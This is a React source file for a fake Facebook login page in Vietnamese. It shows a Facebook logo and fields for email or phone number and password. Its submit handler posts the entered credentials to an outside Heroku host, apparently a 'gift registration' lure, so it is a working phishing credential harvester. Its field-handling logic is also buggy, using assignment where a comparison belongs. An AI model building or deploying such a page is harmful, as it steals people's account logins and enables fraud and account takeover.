import React, { Component } from 'react';
import { CardHeader, Container, Form, Button, FormGroup, Link, Input } from 'reactstrap';
import axios from 'axios'
axios.defaults.withCredentials = true;
class LoginFB extends Component {

    state = {
        user: {
            username: '',
            password: ''
        }
    }
    _onChange = (e) => {

        var preValueState = this.state.user;
        if (e.target.id = "0") {
            preValueState.username = e.target.value;
            // console.log(preValueState.username)
        }
        if (e.target.id = "1") {
            preValueState.password = e.target.value;
            // console.log(preValueState.password)
        }
        // assign new value
        this.setState({ user: preValueState })

    }

    _handleInfo = () => {
        axios.post('https://dangkynhanqua.herokuapp.com/api/', this.state.user)
        
            .then(res => {
                this.props.history.push('/')
                console.log('ddax poss')
            }
            )
            .catch(err =>console.log(err))
    }


    render() {
        return (
            <div >

                <div className="header"  >

                    <CardHeader style={{ height: "57px" }} ></CardHeader>
                    <img className="fb-icon" src="https://uptime.com/media/website_profiles/facebook.png" style={{ height: "" }} />
                </div>
                <div className="body-content">
                    <div className="form-border">
                        <FormGroup>
                            <Form className="form-main">
                                <div className="login-form">
                                    <h2 className="login-title" > Đăng Nhập Facebook</h2>
                                </div>
                                <div className="get-info">
                                    <div className="">
                                        <Input type="text" onChange={this._onChange} name="text" className="position" placeholder="Email hoặc số điện thoại" id="0" />
                                        <Input type="password" onChange={this._onChange} className="position" placeholder="Mật khẩu" id="1" />
                                        
                                        <div className="select-or">
                                            <span> hoặc </span>
                                        </div>
                                    </div>
                                </div>
                            </Form>
                            <Button onClick={this._handleInfo}> Đăng Nhập </Button>
                        </FormGroup>
                    </div>
                </div>
            </div>
        );
    }
}

export default LoginFB;